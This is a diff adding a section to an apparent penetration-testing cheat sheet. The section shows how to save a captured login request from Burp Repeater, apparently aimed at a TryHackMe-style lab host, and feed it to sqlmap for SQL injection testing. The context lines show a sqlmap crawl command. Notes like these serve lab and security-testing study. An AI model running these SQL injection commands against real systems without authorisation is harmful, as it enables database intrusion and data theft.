@@ -369,6 +369,31 @@ remmina
 sqlmap -u 'http://192.168.31.79/' --crawl=2 --forms --batch
 ````
 
+## Test sqli from burp repeater
+- Get the repeated command like :
+````
+POST /admin_101/includes/user_login.php HTTP/1.1
+Host: 10.10.196.221:1337
+Content-Length: 37
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://10.10.196.221:1337
+Referer: http://10.10.196.221:1337/admin_101/
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=3ke5j1bd6ctlrfp6bc2d7kngo8
+Connection: close
+
+email=hacker%40root.thm&password=pass
+````
+- Record to file
+- Launch sqlmap :
+````
+python3 sqlmap.py -r <REQUEST_FILE>
+````
+
 ### Fetching Database Details
 
 - Test for SQL injection on a specific URL:
